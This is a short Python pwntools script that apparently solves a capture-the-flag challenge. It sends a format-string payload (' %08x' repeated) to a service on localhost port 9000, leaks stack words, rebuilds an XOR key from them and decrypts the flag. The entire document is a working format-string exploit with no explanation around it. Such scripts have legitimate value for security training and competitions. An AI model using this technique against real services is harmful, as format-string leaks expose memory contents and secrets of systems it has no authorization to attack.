from pwn import *
import re

def main():
    # p = process(['./fmt'])
    p = remote('localhost', 9000)
    print(p.recv())
    p.sendline(b' %08x' * 12)
    output = p.recvuntil(b'Bye')
    print(output)
    leak = output.split(b' ')

    # Convert the key 
    key = []
    for part in leak[8:16]:
        key += list(reversed(bytes.fromhex(part.decode())))

    print('Leaked key:', bytes(key).hex())
    # Get the encrypted flag
    enc = leak[17][6:]
    for i in range(min(len(enc), len(key))):
        c = chr(key[i] ^ enc[i])
        if c == '\n':
            break
        print(c, end='')

    print('')

if __name__ == '__main__':
    main()
